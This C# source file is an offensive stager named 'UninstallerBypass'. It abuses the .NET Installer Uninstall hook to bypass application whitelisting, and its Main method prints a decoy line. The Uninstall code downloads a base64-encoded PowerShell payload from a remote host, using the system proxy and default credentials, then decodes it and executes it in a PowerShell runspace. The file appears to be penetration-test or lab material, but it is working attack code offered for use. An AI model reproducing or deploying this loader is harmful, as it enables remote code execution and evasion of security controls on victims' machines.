using System;
using System.Configuration.Install;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Text;

// Need to:
// 1. References > Add > Assemblies > System.Configuration.Install
// 2. References > Browse > c:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

namespace UninstallerBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("2 + 3 = 2");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            // instantiate a PowerShell object
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            // base64 -w 0 payload.ps1 | tee robots.txt
            String cmd = GetPayload("http://192.168.49.83/robots.txt");
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
        public static string GetPayload(string url)
        {
            WebClient client = new WebClient();
            // what be the user agent? 
            // Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
            string compressedEncodedShellcode = client.DownloadString(url);
            byte[] data = Convert.FromBase64String(compressedEncodedShellcode);
            return Encoding.UTF8.GetString(data);
        }
    }
}
